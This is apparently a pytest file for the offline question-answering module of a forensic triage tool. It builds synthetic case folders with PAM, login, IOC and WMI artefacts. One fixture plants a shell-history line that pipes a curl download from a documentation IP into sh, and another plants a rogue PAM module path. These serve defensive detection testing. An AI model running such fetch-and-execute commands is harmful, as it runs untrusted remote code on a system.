"""Eru's offline answers, read from an Elrond case directory (src/web/backend/eru_offline.py)."""
import json
import sys
from pathlib import Path

sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "web" / "backend"))

import eru_offline  # noqa: E402


def case(tmp_path):
    host = tmp_path / "CASE01" / "lab-ubuntu"
    cooked = host / "artefacts" / "cooked"
    cooked.mkdir(parents=True)
    (host / "analysis").mkdir()
    (host / "artefacts" / "host.info").write_text("lab-ubuntu::Linux\nLinux lab-ubuntu 6.8\n")
    (tmp_path / "CASE01" / "mitre_techniques.txt").write_text("T1556.003\nT1110.001\nnot-a-technique\n")
    (cooked / "pam.csv").write_text("Source,Type,Control,Module,Arguments,Flag\n"
                                    "/etc/pam.d/sshd,auth,required,pam_unix.so,,\n"
                                    "/etc/pam.d/lab,auth,sufficient,/tmp/.x/pam_lab.so,,module outside the PAM security directory\n")
    (cooked / "kernel_modules.csv").write_text("Name,Size,Instances,State,Taint,Path,SHA256,Flag\n"
                                               "vboxdrv,1,1,Live,OE,/lib/modules/x/vboxdrv.ko,,out-of-tree; unsigned\n")
    (cooked / "login_records.csv").write_text("Source,Type,User,Terminal,Host,Address,PID,LastWriteTime\n"
                                              "/var/log/wtmp,USER_PROCESS,bob,pts/0,,10.0.0.5,1,2026-10-01T00:00:00Z\n"
                                              "/var/log/btmp,LOGIN_PROCESS,root,ssh:notty,,198.51.100.77,2,2026-10-01T00:00:01Z\n")
    (cooked / "gandalf+bash_history.csv").write_text("Command\nls\ncurl http://198.51.100.23/b | sh\n")
    (host / "analysis" / "iocs.csv").write_text("Filename,ioc,indicator_type\nx,198.51.100.23,ipv4\nx,198.51.100.23,ipv4\ny,a.test,domain\n")
    return str(tmp_path / "CASE01")


def test_case_answers(tmp_path):
    path = case(tmp_path)
    assert "lab-ubuntu**: Linux" in eru_offline.answer("hosts", path)
    assert "T1110.001, T1556.003" in eru_offline.answer("techniques", path)
    persistence = eru_offline.answer("persistence", path)
    assert "/tmp/.x/pam_lab.so" in persistence and "pam_unix" not in persistence and "vboxdrv" not in persistence
    logins = eru_offline.answer("logins", path)
    assert "bob (1)" in logins and "198.51.100.77 (1)" in logins
    assert "curl http://198.51.100.23/b | sh" in eru_offline.answer("commands", path)
    assert "198.51.100.23 (×2)" in eru_offline.answer("iocs", path)
    assert "found nothing" in eru_offline.answer("analysis", path)


def test_wmi_subscriptions(tmp_path):
    host = tmp_path / "CASE02" / "LAB-WIN11"
    cooked = host / "artefacts" / "cooked"
    cooked.mkdir(parents=True)
    (cooked / "wbem.json").write_text(json.dumps([
        {"filter_name": "LabUpdaterFilter", "consumer_class": "CommandLineEventConsumer",
         "consumer_name": "LabUpdaterConsumer", "consumer_values": ["cmd.exe /c exit 0"]},
        {"filter_name": "SCM Event Log Filter", "consumer_class": "NTEventLogEventConsumer",
         "consumer_name": "SCM Event Log Consumer", "consumer_values": [], "note": "likely benign: SCM"},
    ]))
    persistence = eru_offline.answer("persistence", str(tmp_path / "CASE02"))
    assert "LabUpdaterFilter -> CommandLineEventConsumer 'LabUpdaterConsumer': cmd.exe /c exit 0" in persistence
    assert "SCM Event Log" not in persistence


def test_general_and_missing_case():
    assert "ollama pull" in eru_offline.answer("enable_llm", None)
    assert "Select a processed case" in eru_offline.answer("persistence", None)
    ids = [q["id"] for q in eru_offline.catalogue()]
    assert "persistence" in ids and "enable_llm" in ids


def test_unavailable_reasons():
    down = eru_offline.unavailable_reason({"available": False}, "http://h:11434", "llama3.2:3b")
    assert "isn't reachable at http://h:11434" in down and "ollama pull llama3.2:3b" in down
    no_model = eru_offline.unavailable_reason({"available": True, "model_loaded": False, "models": ["qwen2.5"]},
                                              "http://h:11434", "llama3.2:3b")
    assert "isn't pulled" in no_model and "qwen2.5" in no_model
    assert eru_offline.unavailable_reason({"available": True, "model_loaded": True}, "h", "m") == ""
